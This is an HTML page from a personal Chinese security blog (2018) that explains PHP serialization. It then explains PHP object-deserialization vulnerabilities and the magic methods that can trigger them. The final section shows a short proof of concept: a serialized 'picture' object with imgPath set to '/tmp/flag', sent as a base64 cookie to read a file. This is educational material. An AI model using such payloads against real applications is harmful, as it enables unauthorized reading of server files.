@@ -1,0 +1,720 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="HexoWorld" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="序列化与反序列化把复杂的数据类型压缩到一个字符串中serialize() 把变量和它们的值编码成文本形式unserialize() 恢复原先变量   1.创建一个$arr数组用于储存用户基本信息，并在浏览器中输出查看结果；1234567&amp;gt; $arr=array();&amp;gt; $arr[&amp;apos;name&amp;apos;]=&amp;apos;张三&amp;apos;;&amp;gt; $arr[&amp;apos;age&amp;a">
+<meta property="og:type" content="article">
+<meta property="og:title" content="xu_lie_hua">
+<meta property="og:url" content="http://yoursite.com/2018/11/07/xu-lie-hua/index.html">
+<meta property="og:site_name" content="Zmore&#39;s黑板报">
+<meta property="og:description" content="序列化与反序列化把复杂的数据类型压缩到一个字符串中serialize() 把变量和它们的值编码成文本形式unserialize() 恢复原先变量   1.创建一个$arr数组用于储存用户基本信息，并在浏览器中输出查看结果；1234567&amp;gt; $arr=array();&amp;gt; $arr[&amp;apos;name&amp;apos;]=&amp;apos;张三&amp;apos;;&amp;gt; $arr[&amp;apos;age&amp;a">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2018-11-07T15:37:33.515Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="xu_lie_hua">
+<meta name="twitter:description" content="序列化与反序列化把复杂的数据类型压缩到一个字符串中serialize() 把变量和它们的值编码成文本形式unserialize() 恢复原先变量   1.创建一个$arr数组用于储存用户基本信息，并在浏览器中输出查看结果；1234567&amp;gt; $arr=array();&amp;gt; $arr[&amp;apos;name&amp;apos;]=&amp;apos;张三&amp;apos;;&amp;gt; $arr[&amp;apos;age&amp;a">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/11/07/xu-lie-hua/"/>
+
+
+
+
+
+  <title>xu_lie_hua | Zmore's黑板报</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Zmore's黑板报</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-主页">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            主页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-文章">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            文章
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/07/xu-lie-hua/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Zmore">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Zmore's黑板报">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">xu_lie_hua</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-07T23:06:24+08:00">
+                2018-11-07
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h1><p>把复杂的数据类型压缩到一个字符串中<br><strong>serialize()</strong> 把变量和它们的值编码成文本形式<br><strong>unserialize()</strong> 恢复原先变量  </p>
+<h4 id="1-创建一个-arr数组用于储存用户基本信息，并在浏览器中输出查看结果；"><a href="#1-创建一个-arr数组用于储存用户基本信息，并在浏览器中输出查看结果；" class="headerlink" title="1.创建一个$arr数组用于储存用户基本信息，并在浏览器中输出查看结果；"></a>1.创建一个$arr数组用于储存用户基本信息，并在浏览器中输出查看结果；</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt; $arr=array();</span><br><span class="line">&gt; $arr[&apos;name&apos;]=&apos;张三&apos;;</span><br><span class="line">&gt; $arr[&apos;age&apos;]=&apos;22&apos;;</span><br><span class="line">&gt; $arr[&apos;sex&apos;]=&apos;男&apos;;</span><br><span class="line">&gt; $arr[&apos;phone&apos;]=&apos;123456789&apos;;</span><br><span class="line">&gt; $arr[&apos;address&apos;]=&apos;上海市浦东新区&apos;;</span><br><span class="line">&gt; var_dump($arr)；</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p> 输出结果：   </p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">array(5) &#123; </span><br><span class="line">[&quot;name&quot;]=&gt; string(6) &quot;张三&quot; </span><br><span class="line">[&quot;age&quot;]=&gt; string(2) &quot;22&quot; </span><br><span class="line">[&quot;sex&quot;]=&gt; string(3) &quot;男&quot; </span><br><span class="line">[&quot;phone&quot;]=&gt; string(9) &quot;123456789&quot; </span><br><span class="line">[&quot;address&quot;]=&gt; string(21) &quot;上海市浦东新区&quot;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+<h4 id="2-将-arr数组进行序列化赋值给-info字符串，并在浏览器中输出查看结果"><a href="#2-将-arr数组进行序列化赋值给-info字符串，并在浏览器中输出查看结果" class="headerlink" title="2.将$arr数组进行序列化赋值给$info字符串，并在浏览器中输出查看结果"></a>2.将$arr数组进行序列化赋值给$info字符串，并在浏览器中输出查看结果</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$info=serialize($arr);</span><br><span class="line">var_dump($info);</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>输出结果：</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string(140) &quot;a:5:&#123;s:4:&quot;name&quot;;s:6:&quot;张三&quot;;s:3:&quot;age&quot;;s:2:&quot;22&quot;;s:3:&quot;sex&quot;;s:3:&quot;男&quot;;s:5:&quot;phone&quot;;s:9:&quot;123456789&quot;;s:7:&quot;address&quot;;s:21:&quot;上海市浦东新区&quot;;&#125;&quot;</span><br></pre></td></tr></table></figure>
+<p>使用序列化<br><strong>serialize($arr)</strong><br>函数，将数组中元素的键和值按照规则顺序连接成字符串。  </p>
+<blockquote>
+<p>a：5标志序列化为array包含5个键值对.<br>s：4标志内容为字符串包含4个字符。  </p>
+</blockquote>
+<p>通过序列化我们可以将一些模块化的数据使用字符串的形式存储在数据库或session等，可以减少创建众多繁琐的数据表字段，当然序列化为字符串存储会增加额外的空间，应合理的设计和应用。</p>
+<h4 id="3-最后使用unserialize-info-反序列化将字符串还原成我们需要的数组模式"><a href="#3-最后使用unserialize-info-反序列化将字符串还原成我们需要的数组模式" class="headerlink" title="3.最后使用unserialize($info)反序列化将字符串还原成我们需要的数组模式"></a>3.最后使用unserialize($info)反序列化将字符串还原成我们需要的数组模式</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$zhangsan=unserialize($info);</span><br><span class="line">var_dump($zhangsan);</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>输出结果：</p>
+</blockquote>
+<p>实现了对数组的还原</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">array(5) &#123;</span><br><span class="line">[&quot;name&quot;]=&gt; string(6) &quot;张三&quot; </span><br><span class="line">[&quot;age&quot;]=&gt; string(2) &quot;22&quot; </span><br><span class="line">[&quot;sex&quot;]=&gt; string(3) &quot;男&quot; </span><br><span class="line">[&quot;phone&quot;]=&gt; string(9) &quot;123456789&quot; </span><br><span class="line">[&quot;address&quot;]=&gt; string(21) &quot;上海市浦东新区&quot; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="php序列化漏洞原理"><a href="#php序列化漏洞原理" class="headerlink" title="php序列化漏洞原理"></a>php序列化漏洞原理</h1><p>参考：<a href="https://www.cnblogs.com/perl6/p/7124345.html" target="_blank" rel="noopener">https://www.cnblogs.com/perl6/p/7124345.html</a></p>
+<p>原理：</p>
+<p>==函数<br><strong>unserialize()</strong><br>后会导致<br><strong>__wakeup()</strong><br>或<br><strong>__destruct()</strong><br>的直接调用，中间无需其他过程。因此最理想的情况就是一些漏洞/危害代码在<br><strong>__wakeup()</strong><br>或<br><strong>__destruct()</strong><br>中，从而当我们控制序列化字符串时可以去直接触发它们。==</p>
+<p>对一个对象进行反序列化处理时<br>如果对象存在可控的参数<br>析构函数在每个对象结束时都会运行（也就是<strong>魔术方法</strong>）<br>传入一个不存在的参数<br>析构也会执行  </p>
+<h6 id="在PHP中，-类被创建或消失后，-都会自动的执行某些函数，-如："><a href="#在PHP中，-类被创建或消失后，-都会自动的执行某些函数，-如：" class="headerlink" title="在PHP中， 类被创建或消失后， 都会自动的执行某些函数， 如："></a>在PHP中， 类被创建或消失后， 都会自动的执行某些函数， 如：</h6><blockquote>
+<p><strong>construct()  
+</strong>destruct()<br><strong>call()  
+</strong>callStatic()<br><strong>get()   
+</strong>set()<br><strong>isset()  
+</strong>unset()<br><strong>sleep()   
+</strong>wakeup()<br><strong>toString()   
+</strong>invoke()<br><strong>set_state()   
+</strong>clone()<br><strong>autoload()<br>Exception::</strong>toString<br>ErrorException::<strong>toString<br>DateTime::</strong>wakeup<br>ReflectionException::<strong>toString<br>ReflectionFunctionAbstract::</strong>toString<br>ReflectionFunction::<strong>toString<br>ReflectionParameter::</strong>toString<br>ReflectionMethod::<strong>toString<br>ReflectionClass::</strong>toString<br>ReflectionObject::<strong>toString<br>ReflectionProperty::</strong>toString<br>ReflectionExtension::<strong>toString<br>LogicException::</strong>toString<br>BadFunctionCallException::<strong>toString<br>BadMethodCallException::</strong>toString<br>DomainException::<strong>toString<br>InvalidArgumentException::</strong>toString<br>LengthException::<strong>toString<br>OutOfRangeException::</strong>toString<br>RuntimeException::__toString  </p>
+</blockquote>
+<p>所以这些都可以作为利用的方法    </p>
+<h1 id="一个序列化应用"><a href="#一个序列化应用" class="headerlink" title="一个序列化应用"></a>一个序列化应用</h1><p>原文：<a href="http://foreversong.cn/archives/1326" target="_blank" rel="noopener">http://foreversong.cn/archives/1326</a>    </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$user_data = @unserialize(base64_decode($_COOKIE[&apos;AshopToken&apos;]));</span><br></pre></td></tr></table></figure>
+<p><strong>COOKIE[‘AshopToken’]</strong>  函数可控</p>
+<p>在<strong>lib/class/picture.class.php</strong>中找到了  <strong>_wakeup</strong>函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function __wakeup() &#123;</span><br><span class="line">    echo file_get_contents($this-&gt;imgPath);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+<p>新建一个picture的类</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$poc = new picture(&apos;123&apos;,&apos;456&apos;);</span><br><span class="line">$poc-&gt;imgPath = &apos;/tmp/flag&apos;;</span><br><span class="line">$adog = base64_encode(serialize($poc));</span><br><span class="line">echo $adog;</span><br></pre></td></tr></table></figure>
+<p>传入序列化后的cookie即可</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/10/26/Classical-cipher/" rel="next" title="Classical cipher">
+                <i class="fa fa-chevron-left"></i> Classical cipher
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/avatar.png"
+                alt="Zmore" />
+            
+              <p class="site-author-name" itemprop="name">Zmore</p>
+              <p class="site-description motion-element" itemprop="description">优雅~</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/Zmore7" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:zmore7@126.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#序列化与反序列化"><span class="nav-number">1.</span> <span class="nav-text">序列化与反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-创建一个-arr数组用于储存用户基本信息，并在浏览器中输出查看结果；"><span class="nav-number">1.0.0.1.</span> <span class="nav-text">1.创建一个$arr数组用于储存用户基本信息，并在浏览器中输出查看结果；</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-将-arr数组进行序列化赋值给-info字符串，并在浏览器中输出查看结果"><span class="nav-number">1.0.0.2.</span> <span class="nav-text">2.将$arr数组进行序列化赋值给$info字符串，并在浏览器中输出查看结果</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-最后使用unserialize-info-反序列化将字符串还原成我们需要的数组模式"><span class="nav-number">1.0.0.3.</span> <span class="nav-text">3.最后使用unserialize($info)反序列化将字符串还原成我们需要的数组模式</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#php序列化漏洞原理"><span class="nav-number">2.</span> <span class="nav-text">php序列化漏洞原理</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#在PHP中，-类被创建或消失后，-都会自动的执行某些函数，-如："><span class="nav-number">2.0.0.0.0.1.</span> <span class="nav-text">在PHP中， 类被创建或消失后， 都会自动的执行某些函数， 如：</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#一个序列化应用"><span class="nav-number">3.</span> <span class="nav-text">一个序列化应用</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Zmore</span>
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
